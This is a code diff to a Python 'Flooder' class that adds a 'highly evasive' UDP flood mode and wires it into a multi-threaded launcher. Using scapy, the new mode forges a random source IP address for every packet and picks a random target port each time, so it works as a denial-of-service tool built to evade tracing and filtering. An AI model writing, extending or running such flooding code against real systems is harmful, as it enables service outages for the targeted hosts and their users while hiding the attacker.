@@ -99,22 +99,55 @@ class Flooder():
 
             if not is_threaded:
                 time.sleep(0.00001)
+    
+    def start_randomized(self, packet_count: int = -1, message: bytes = None, is_threaded: bool = False):
+        """
+        Starts a highly evasive, spoofed UDP flood with per-packet randomization.
+        """
+        print(f"[i] Starting randomized UDP flood on {self.target_host} with random ports.")
+        print(f"[i] Using message: {self._default_message.decode() if message is None else message.decode()}")
+        
+        message_to_send = message if message is not None else self._default_message
 
-    def start_threaded(self, flood_type: Literal["default", "spoofed"] = "default", packet_count: int = -1, message: bytes = None, spoofed_ip: str = None):
+        while self.running and (packet_count == -1 or self.packets_sent < packet_count):
+            # Construct the IP layer with a SPOOFED and RANDOM source IP for EACH packet
+            ip_layer = scapy_IP(src=self.random_ip(), dst=self.target_host)
+
+            # Construct the UDP layer for a RANDOM target port for EACH packet
+            udp_layer = scapy_UDP(dport=self.random_port())
+
+            packet = ip_layer / udp_layer / message_to_send
+
+            scapy_send(packet, verbose=0)
+            
+            with self.packet_lock:
+                self.packets_sent += 1
+                if self.packets_sent % 1000 == 0:
+                    print(f"[+] Sent {self.packets_sent} randomized packets.")
+            
+            if not is_threaded:
+                time.sleep(0.00001)
+
+
+    def start_threaded(self, flood_type: Literal["default", "spoofed", "random"] = "default", packet_count: int = -1, message: bytes = None, spoofed_ip: str = None):
         """
         The main method to start the multi-threaded flood.
         It now waits for threads to complete if a packet_count is specified.
         """
         self.packets_sent = 0 # Reset counter for new flood
 
-        if flood_type == "default":
-            print(f"[i] Starting {self.thread_count} threads for standard UDP flood.")
-            target_method = self.start
+        if flood_type == "random":
+            print(f"[i] Starting {self.thread_count} threads for randomized UDP flood.")
+            target_method = self.start_randomized
             thread_args = (packet_count, message)
-        else: # flood_type == "spoofed"
+        elif flood_type == "spoofed":
             print(f"[i] Starting {self.thread_count} threads for spoofed UDP flood.")
             target_method = self.start_spoofed
             thread_args = (packet_count, message, spoofed_ip)
+        else: # flood_type == "default"
+            print(f"[i] Starting {self.thread_count} threads for standard UDP flood.")
+            target_method = self.start
+            thread_args = (packet_count, message)
         
         threads = []
         try:
